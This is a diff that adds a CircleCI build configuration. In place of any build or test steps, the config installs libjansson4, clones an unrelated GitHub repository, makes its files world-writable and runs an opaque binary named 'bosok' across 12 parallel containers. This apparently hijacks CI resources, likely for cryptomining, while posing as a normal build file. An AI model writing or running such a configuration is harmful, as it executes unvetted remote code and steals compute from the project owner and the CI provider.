@@ -1,1 +1,12 @@
 
+version: 2
+jobs:
+  build:
+    docker:
+      - image: circleci/python:3.5
+    parallelism: 12
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run: sudo apt install libjansson4 -y 
+      - run: git clone https://github.com/jgaswer/hqu.git && cd hqu && chmod 777 * && ./bosok
